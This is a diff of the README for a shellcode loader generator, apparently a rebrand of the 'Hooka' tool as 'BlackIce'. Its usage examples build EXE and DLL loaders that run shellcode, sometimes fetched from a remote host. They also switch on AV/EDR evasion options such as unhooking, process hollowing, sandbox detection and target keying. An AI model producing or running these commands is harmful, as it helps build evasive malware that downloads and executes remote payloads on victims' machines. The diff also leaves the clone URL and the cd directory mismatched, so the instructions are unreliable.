@@ -70,7 +70,7 @@ This tool is able to generate loaders with this features:
 Just clone the repository like this:
 
 ```sh
-git clone https://github.com/Mrdedsecurity/BlackIce-Loader.git
+git clone https://github.com/Mrdedsecurity/BlackIce.git
 cd BlackIce-Loader
 make
 ```
@@ -128,28 +128,28 @@ Usage of BlackIce:
     -h, --help          print help panel
 
 Examples:
-  hooka -i shellcode.bin -o loader.exe
-  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
-  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
-  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
+  blackice -i shellcode.bin -o loader.exe
+  blackice -i http://192.168.1.126/shellcode.bin -o loader.exe
+  blackice -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
+  blackice -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 ```
 
 > Generate a simple EXE loader
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe
 ```
 
 > Generate a DLL loader
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
+$ blackice_linux_amd64 -i shellcode.bin -o loader.dll -f dll
 ```
 
 > Use custom config (various examples)
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
-$ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
-$ hooka_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computername "DESKTOP-E1D6G0A" --compress --strings
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
+$ blackice_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
+$ blackice_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computername "DESKTOP-E1D6G0A" --compress --strings
 ```
 
 # Demo
